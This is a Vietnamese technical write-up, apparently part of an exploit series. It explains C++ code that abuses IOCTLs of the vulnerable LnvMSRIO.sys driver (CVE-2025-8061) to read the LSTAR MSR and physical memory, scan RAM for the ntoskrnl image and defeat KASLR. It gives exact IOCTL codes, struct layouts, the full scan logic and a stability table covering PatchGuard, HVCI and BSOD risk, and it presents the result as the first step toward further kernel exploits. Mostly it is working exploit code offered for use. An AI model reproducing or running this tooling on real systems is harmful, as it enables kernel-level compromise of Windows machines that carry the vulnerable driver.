# 01 — KASLR Defeat (MSR LSTAR + Physical RAM Scan)

**File:** `01_kaslr_defeat.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** MSR read + Physical memory read  
**Output:** VA base của ntoskrnl.exe trên máy đang chạy

---

## Mục tiêu

KASLR (Kernel Address Space Layout Randomization) randomize địa chỉ load của kernel mỗi lần boot. Không có base address của ntoskrnl.exe, ta không thể tính địa chỉ của bất kỳ symbol nào (ví dụ: PsInitialSystemProcess, PspCreateProcessNotifyRoutineArray, v.v.). Đây là bước **đầu tiên bắt buộc** trong mọi kernel exploit.

---

## Lý thuyết nền

### LSTAR MSR (0xC0000082)

Trên x64, khi user-mode code thực thi lệnh `SYSCALL`, CPU tự động jump đến địa chỉ được lưu trong MSR `IA32_LSTAR` (0xC0000082). Windows đặt `KiSystemCall64` vào đó — đây là entry point của mọi syscall kernel. Vì `KiSystemCall64` nằm bên trong ntoskrnl.exe, đọc LSTAR cho ta **một địa chỉ VA bất kỳ bên trong ntoskrnl**.

### Tại sao scan vật lý thay vì NtQuerySystemInformation?

`NtQuerySystemInformation(SystemModuleInformation)` cũng trả về ntoskrnl base — nhưng kỹ thuật vật lý scan này **không dùng bất kỳ syscall nào phụ thuộc vào privilege level**. Nó dùng IOCTL của driver, bypass hoàn toàn. Đây là cách demo primitive mạnh đến đâu.

### ntoskrnl.exe luôn align 2MB

Windows map ntoskrnl bằng large page (2MB = 0x200000). Điều này đảm bảo physical address của ntoskrnl **luôn là bội số của 0x200000**. Tính chất này cho phép ta scan physical RAM với step 2MB thay vì từng byte.

---

## IOCTL Layout của LnvMSRIO.sys

```
MSR read  (0x9c402084):
  Input:  { DWORD Register }          (4 bytes)
  Output: { UINT64 Value }            (8 bytes)

Phys read (0x9c406104):
  Input:  { UINT64 PA; DWORD AccessSize; DWORD Count }
          AccessSize: 1=BYTE, 2=WORD, 8=QWORD
          Total bytes đọc = AccessSize × Count (max 4096)
  Output: raw bytes
```

---

## Giải thích code từng dòng

### Structs input/output

```cpp
#pragma pack(push, 1)
struct MsrReadIn  { DWORD Register; };
struct MsrReadOut { UINT64 Value;   };
#pragma pack(pop)
```

`#pragma pack(push, 1)` — tắt padding của compiler. Driver expect layout byte-exact, nếu có padding thì field offset sai → IOCTL fail.

```cpp
struct PhysReadIn {
    UINT64 PhysAddr;    // địa chỉ vật lý cần đọc
    DWORD  AccessSize;  // kích thước mỗi element: 1, 2, hoặc 8
    DWORD  Count;       // số lượng element → tổng = AccessSize * Count bytes
};
```

Driver dùng `MmMapIoSpace(PhysAddr, AccessSize*Count)` để map physical memory vào kernel VA rồi đọc.

### ReadMSR()

```cpp
static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn  in  = { msr };           // chỉ cần gửi MSR register number
    MsrReadOut res = {};
    DWORD      got = 0;

    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ,
                         &in, sizeof(in), &res, sizeof(res), &got, nullptr)
        || got < sizeof(res)) {
        printf("[-] ReadMSR(0x%08X): error %lu\n", msr, GetLastError());
        return false;
    }
    *out = res.Value;
    return true;
}
```

Driver thực thi `RDMSR` instruction trong ring 0 (chỉ kernel mới được đọc MSR trực tiếp). Output là 64-bit value của MSR đó.

### PhysRead() và PhysReadU64()

```cpp
static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;   // driver giới hạn 4096 bytes/IOCTL
    PhysReadIn in  = { pa, 1, len };        // AccessSize=1 (byte), Count=len
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           buf,  len,
                           &got, nullptr) && (got == len);
}
```

Với `AccessSize=1, Count=len` → đọc `len` bytes liên tiếp từ physical address `pa`. Giới hạn 4096 bytes vì driver dùng `MmMapIoSpace` và không hỗ trợ map lớn hơn trong 1 call.

```cpp
static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in  = { pa, 8, 1 };          // AccessSize=8 (QWORD), Count=1
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           out,  sizeof(*out),
                           &got, nullptr) && (got == 8);
}
```

Đọc đúng 8 bytes (1 QWORD) từ physical address. Dùng cho việc đọc pointer, page table entry.

### PE Header Helpers

```cpp
static bool IsValidPE64(const uint8_t *p, size_t sz)
{
    if (sz < 0x100)                          return false;
    if (p[0] != 'M' || p[1] != 'Z')         return false;   // kiểm tra MZ signature

    LONG lfanew = *(const LONG *)(p + 0x3C);                 // offset của PE header
    if (lfanew < 0 || (size_t)lfanew + 0x100 > sz) return false;

    if (*(const DWORD *)(p + lfanew) != 0x00004550u) return false; // "PE\0\0"
    if (*(const WORD  *)(p + lfanew + 4) != 0x8664)  return false; // Machine = AMD64
    if (*(const WORD  *)(p + lfanew + 0x18) != 0x020B) return false; // Magic = PE32+
    return true;
}
```

PE header layout (từ offset 0):
- `0x00`: `MZ` — DOS signature
- `0x3C`: `e_lfanew` — offset đến PE header
- `e_lfanew + 0x00`: `PE\0\0` — PE signature
- `e_lfanew + 0x04`: `Machine` = `0x8664` = AMD64
- `e_lfanew + 0x18`: `Magic` = `0x020B` = PE32+ (64-bit)

```cpp
static uint64_t PE64_ImageBase(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint64_t *)(p + lfanew + 0x30);
    // e_lfanew + 0x18 (OptionalHeader start) + 0x18 (ImageBase offset in OptHdr) = +0x30
}

static uint32_t PE64_SizeOfImage(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x50);
    // OptionalHeader + 0x38 = SizeOfImage
}

static uint32_t PE64_ExportDirRVA(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x88);
    // OptionalHeader + 0x70 = DataDirectory[0].VirtualAddress (Export)
}
```

Các offset này cố định trong PE spec cho PE32+ (64-bit binary).

### PhysRamTop()

```cpp
static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    // Thêm 512MB headroom (một số máy có physical RAM holes)
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    // Round up lên bội số 2MB (2MB = 0x200000 = scan step)
    return (top + 0x1FFFFULL) & ~0x1FFFFFULL;
}
```

Ta scan đến `total_physical_ram + 512MB` để cover các hệ thống có memory holes ở giữa. Round up lên 2MB vì step scan là 2MB.

### Phase 1: Đọc LSTAR

```cpp
uint64_t lstar = 0;
if (!ReadMSR(0xC0000082, &lstar) || !lstar) {
    printf("[-] Failed to read LSTAR\n");
    CloseHandle(g_dev); return 1;
}
// Sanity check: phải là kernel VA (> 0xFFFF000000000000)
if (lstar < 0xFFFF000000000000ULL) {
    printf("[-] LSTAR value looks wrong (user-space VA?)\n");
    CloseHandle(g_dev); return 1;
}
```

`KiSystemCall64` luôn có canonical kernel VA trên Windows x64 (high half, bit 63 = 1).

### Phase 2: Scan Physical RAM

```cpp
for (uint64_t pa = 0x100000ULL; pa < ram_top; pa += 0x200000ULL) {

    // Bỏ qua PCI/MMIO hole: 0xC0000000 - 0xFFFFFFFF
    // Đây không phải RAM — driver BSOD nếu cố đọc vùng này
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;

    // Đọc 4KB đầu tiên của page 2MB này
    if (!PhysRead(pa, page, sizeof(page))) continue;

    // Quick check MZ trước để tiết kiệm thời gian
    if (page[0] != 'M' || page[1] != 'Z') continue;

    if (!IsValidPE64(page, sizeof(page))) continue;

    uint64_t img_base = PE64_ImageBase(page);
    uint32_t img_size = PE64_SizeOfImage(page);

    // Phải là kernel VA space
    if (img_base < 0xFFFF800000000000ULL) continue;

    // KiSystemCall64 phải nằm trong [ImageBase, ImageBase + SizeOfImage)
    if (lstar < img_base || lstar >= (uint64_t)img_base + img_size) continue;
```

Logic: với mỗi 2MB boundary trong physical RAM, đọc 4KB đầu và kiểm tra:
1. Có MZ + valid PE64 không?
2. ImageBase có phải kernel VA không?
3. `KiSystemCall64` (= LSTAR) có nằm trong range `[ImageBase, ImageBase+SizeOfImage)` không?

Nếu điều kiện 3 đúng → đây gần chắc chắn là ntoskrnl.

```cpp
    // Verify bằng Export Directory → đọc module name
    uint32_t exp_rva = PE64_ExportDirRVA(page);
    char mod_name[32] = "<unknown>";

    if (exp_rva && exp_rva + 0x20 < img_size) {
        uint8_t expdir[20] = {};
        if (PhysRead(pa + exp_rva, expdir, sizeof(expdir))) {
            uint32_t name_rva = *(uint32_t *)(expdir + 0x0C);
            // IMAGE_EXPORT_DIRECTORY.Name (+0x0C) = RVA của chuỗi tên module
            if (name_rva && name_rva + sizeof(mod_name) < img_size)
                PhysRead(pa + name_rva, mod_name, sizeof(mod_name) - 1);
        }
    }

    // Chấp nhận "ntoskrnl.exe", "ntkrnlmp.exe" (multiprocessor variant)
    if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
        _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
        _stricmp(mod_name, "ntkrpamp.exe") == 0) {
        found_pa   = pa;
        found_base = img_base;
        found_size = img_size;
        break;
    }
```

`IMAGE_EXPORT_DIRECTORY` layout:
- `+0x00` Characteristics
- `+0x04` TimeDateStamp  
- `+0x08` MajorVersion, MinorVersion
- `+0x0C` **Name** (RVA của chuỗi tên module)
- `+0x10` Base
- `+0x14` NumberOfFunctions
- `+0x18` NumberOfNames
- `+0x1C` AddressOfFunctions
- `+0x20` AddressOfNames
- `+0x24` AddressOfNameOrdinals

### Output

```cpp
uint64_t lstar_offset = lstar - found_base;  // offset của KiSystemCall64 trong ntoskrnl

printf(" ntoskrnl  VA base   : 0x%016llX\n", found_base);
printf(" ntoskrnl  PA base   : 0x%016llX\n", found_pa);
printf(" KiSystemCall64 +off : +0x%llX\n",   lstar_offset);
```

**`found_base` là kết quả cần thiết** cho mọi technique tiếp theo: để tính địa chỉ của bất kỳ ntoskrnl export nào, ta dùng `found_base + export_RVA`.

---

## Bonus: Đọc prologue của KiSystemCall64

```cpp
uint64_t ki_pa = found_pa + lstar_offset;
// = physical address của ntoskrnl base + offset của KiSystemCall64
// Vì ntoskrnl được map liên tục từ found_pa, offset trong VA = offset trong PA

uint8_t prologue[16] = {};
if (PhysRead(ki_pa, prologue, sizeof(prologue))) {
    printf("[+] KiSystemCall64 @ PA 0x%016llX:\n    ", ki_pa);
    for (int i = 0; i < 16; i++) printf("%02X ", prologue[i]);
}
```

Đây là **bằng chứng** rằng ta đọc được kernel code trực tiếp từ physical memory.

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | Không có nguy cơ — chỉ đọc, không ghi |
| HVCI | Không ảnh hưởng — chỉ đọc physical |
| Race condition | Không — ntoskrnl không di chuyển sau boot |
| BSOD risk | Thấp — chỉ nguy cơ nếu đọc trúng PCI MMIO (đã skip) |

---

## Tóm tắt flow

```
ReadMSR(LSTAR) → KiSystemCall64 VA
    ↓
Scan PA từ 0x100000, step 2MB
    ↓
Với mỗi PA: đọc 4KB
    ↓ MZ? PE64? ImageBase ∈ kernel space?
    ↓ LSTAR ∈ [ImageBase, ImageBase+Size)?
    ↓ ExportDir.Name == "ntoskrnl.exe"?
    ↓
→ found_base (ntoskrnl VA), found_pa (ntoskrnl PA)
```
